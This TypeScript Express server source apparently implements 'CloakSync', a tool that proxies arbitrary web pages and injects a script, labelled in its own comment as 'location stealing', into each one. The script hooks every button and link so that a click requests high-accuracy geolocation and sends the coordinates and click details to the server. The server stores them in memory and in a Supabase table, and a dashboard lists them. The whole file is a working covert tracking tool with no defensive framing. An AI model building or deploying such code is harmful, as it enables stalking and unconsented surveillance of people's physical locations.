import express from 'express';
import { createServer as createViteServer } from 'vite';
import axios from 'axios';
import * as cheerio from 'cheerio';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Lazy Supabase client
let supabaseClient: any = null;
const getSupabase = () => {
  if (!supabaseClient) {
    const url = process.env.VITE_SUPABASE_URL;
    const key = process.env.VITE_SUPABASE_ANON_KEY;
    if (url && key) {
      supabaseClient = createClient(url, key);
    }
  }
  return supabaseClient;
};

// In-memory storage for demo purposes (when Supabase is not configured)
const localCaptures: any[] = [];

async function startServer() {
  console.log('Starting server initialization...');
  const app = express();
  const PORT = 3000;

  app.use(express.json());
  console.log('Express middleware configured.');

  // API to get captured locations (for the dashboard)
  app.get('/api/captures', (req, res) => {
    res.json(localCaptures);
  });

  // Proxy route to fetch and modify external landing pages
  app.get('/cloak', async (req, res) => {
    const targetUrl = req.query.url as string;
    if (!targetUrl) {
      return res.status(400).send('URL is required');
    }

    try {
      const response = await axios.get(targetUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        },
        timeout: 10000
      });

      const $ = cheerio.load(response.data);
      
      // Inject our location stealing script
      const injectionScript = `
        <script>
          (function() {
            const API_ENDPOINT = '/api/capture-location';
            const TARGET_URL = ${JSON.stringify(targetUrl)};

            function sendLocation(coords, elementInfo) {
              fetch(API_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  latitude: coords.latitude,
                  longitude: coords.longitude,
                  accuracy: coords.accuracy,
                  target_url: TARGET_URL,
                  element: elementInfo,
                  timestamp: Date.now()
                })
              })
              .then(r => r.json())
              .then(data => console.log('Location captured:', data))
              .catch(err => console.error('Sync failed', err));
            }

            function handleInteraction(e) {
              const el = e.currentTarget;
              const elementInfo = {
                tag: el.tagName,
                text: (el.innerText || el.value || '').substring(0, 50),
                id: el.id,
                className: el.className
              };

              // Request location
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (position) => {
                    sendLocation(position.coords, elementInfo);
                  },
                  (error) => {
                    console.error('Location denied', error);
                  },
                  { enableHighAccuracy: true, timeout: 5000 }
                );
              }
            }

            // Attach to all buttons and links
            document.querySelectorAll('button, a, input[type="button"], input[type="submit"]').forEach(el => {
              el.addEventListener('click', handleInteraction);
            });

            console.log('CloakSync Active');
          })();
        </script>
      `;

      $('body').append(injectionScript);

      // Fix relative links/assets by injecting a <base> tag
      const baseUrl = new URL(targetUrl).origin;
      $('head').prepend(\`<base href="\${baseUrl}/">\`);

      res.send($.html());
    } catch (error) {
      console.error('Cloak error:', error);
      res.status(500).send('Failed to cloak the requested URL. It might be protected by security policies (CSP/X-Frame-Options) or the site is unreachable.');
    }
  });

  // API to receive captured locations
  app.post('/api/capture-location', async (req, res) => {
    const { latitude, longitude, accuracy, target_url, element } = req.body;
    const newCapture = {
      id: Math.random().toString(36).substr(2, 9),
      latitude,
      longitude,
      accuracy,
      target_url,
      element,
      created_at: new Date().toISOString()
    };

    // Always save to in-memory for immediate demo
    localCaptures.unshift(newCapture);
    if (localCaptures.length > 100) localCaptures.pop(); // Limit size
    
    try {
      // Try Supabase if configured
      const supabase = getSupabase();
      if (supabase) {
        const { error } = await supabase
          .from('captured_locations')
          .insert([newCapture]);
        if (error) console.error('Supabase Save Error:', error);
      }
      
      res.json({ status: 'success', mode: 'demo' });
    } catch (error) {
      // Don't fail the request if Supabase fails
      res.json({ status: 'success', mode: 'demo-only' });
    }
  });

  console.log('API routes configured.');

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    console.log('Initializing Vite dev server middleware...');
    try {
      const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: 'spa',
      });
      app.use(vite.middlewares);
      
      // Explicitly serve index.html for the root path in dev
      app.use('*', async (req, res, next) => {
        const url = req.originalUrl;
        try {
          let template = fs.readFileSync(path.resolve(__dirname, 'index.html'), 'utf-8');
          template = await vite.transformIndexHtml(url, template);
          res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
        } catch (e) {
          vite.ssrFixStacktrace(e as Error);
          next(e);
        }
      });
      
      console.log('Vite middleware attached.');
    } catch (e) {
      console.error('Failed to initialize Vite middleware:', e);
    }
  } else {
    console.log('Running in production mode, serving static files...');
    app.use(express.static(path.join(__dirname, 'dist')));
    app.get('*', (req, res) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`>>> Server is listening on http://0.0.0.0:${PORT}`);
  });
}

console.log('Executing startServer()...');
startServer().catch(err => {
  console.error('FATAL: Failed to start server:', err);
});
